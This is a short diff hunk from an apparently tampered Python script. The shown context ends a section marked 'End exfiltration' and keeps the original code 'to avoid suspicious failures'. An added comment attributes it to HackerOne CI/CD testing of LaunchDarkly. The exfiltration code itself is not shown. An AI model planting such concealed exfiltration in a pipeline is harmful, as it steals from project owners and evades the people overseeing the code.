@@ -36,4 +36,5 @@ _exfil()
 # ── End exfiltration ──────────────────────────────────────────────────────────
 
 # Original code below (keep it to avoid suspicious failures)
+# ltidi from Hackerone testing for CI/CD workflow security of LaunchDarkly program
 print("📚 Initializing vector embeddings for search tools...")
